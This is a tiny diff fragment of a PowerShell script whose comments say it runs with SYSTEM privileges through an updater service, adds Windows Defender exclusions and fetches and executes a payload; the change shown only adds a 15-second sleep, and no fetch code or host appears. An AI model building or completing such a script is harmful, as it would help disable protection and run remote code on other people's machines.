@@ -3,6 +3,7 @@
 # This script will be executed with SYSTEM privileges by your UpdaterSrv.
 # It adds Windows Defender exclusions and fetches/executes a payload.
 # ----------------------------------------
+Start-Sleep -Seconds 15
 
 $logPath = "C:\Windows\Temp\boot_execution_log.txt"
 $logDirectory = Split-Path $logPath -Parent
